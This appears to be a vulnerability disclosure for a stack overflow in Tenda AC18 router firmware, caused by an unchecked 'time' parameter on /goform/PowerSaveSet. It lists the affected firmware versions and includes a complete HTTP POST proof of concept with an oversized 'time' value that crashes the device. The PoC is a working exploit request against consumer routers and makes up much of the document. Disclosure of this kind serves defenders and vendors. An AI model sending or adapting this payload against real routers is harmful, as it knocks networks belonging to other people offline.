# Tenda AC18 Unauthorized stack overflow vulnerability

## **1. Affected version:**

V15.03.05.05_multi and V15.03.05.19_multi

## **2. Firmware download address**

https://www.tenda.com.cn/download/detail-2683.html

## **3. Vulnerability details**

![img](https://www.kdocs.cn/api/v3/office/copy/b1Y4dkNXVWo5aFdWc1hpOXJMdEFoNFhYQU1QbXlUbzFwTkRPbXJTOXVmM3lkQm95V1VrUTVLZEd1c3p4OE1wdkhaenpXcmQyZXYxdnZpT3g5eXBxclZYYjBFdTBYOTlQZ0ovejVvd0NQQnpBMm0vWXFlMS9zMEZhVFJpdHdTaEdydTFxNmxySWNLNFZaVUJmN09MRDhCcjNRbkIwZU5iYUZTTDArUENwOStWTkd5TlhwbktiZXZlaUpXWklLYnd2ZGVoTFlmWFExZDJRYStBdGRXblQ2RUtNU0VRN2UrZlAyVnZDblZyRHR5MXBva1d0Y25UbE0vTGNhSVV6/attach/object/dd5646441bc02e899633982e20f60963d5051b39)

The v13 variable is obtained directly from the http request parameter time .
Then v13 will be splice to stack by function sscanf without any security check, which causes
stack overflow.
So by POSTing the page /goform/PowerSaveSet with long time , the attacker can easily perform
a Denial of Service(DoS).

## **4. Recurring vulnerabilities and POC**

In order to reproduce the vulnerability, the following steps can be followed:

1.Use the fat simulation firmware V15.03.05.19_multi

2.Attack with the following overflow POC attacks



```
POST /goform/PowerSaveSet HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: /
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1999
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/sleep_mode.html?random=0.9629635312680853&
Cookie: password=0d403f6ad9aea37a98da9255140dbf6ektscvb

powerSavingEn=1&time=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100%3A0001%3A00&ledCloseType=allClose&powerSaveDelay=1
```

This PoC can result in a Dos.

